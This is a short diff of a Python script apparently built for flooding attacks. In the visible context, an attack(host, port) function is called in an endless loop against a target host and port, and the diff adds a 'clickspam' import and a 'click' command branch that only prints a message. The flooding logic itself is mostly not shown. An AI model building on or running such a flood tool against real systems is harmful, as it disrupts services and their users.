@@ -2,6 +2,7 @@
 import sys
 import urllib
 import socket               # Import socket module
+from clickspam import keyclick
 
 def attack(host="",port=80):
     try:
@@ -48,6 +49,8 @@ if __name__ == "__main__":
 			s.close()
 			while True:
 				attack(target_host, target_port)
+		if(cmd_type[2]=='click'):
+			print('Click spam')
 
 
 
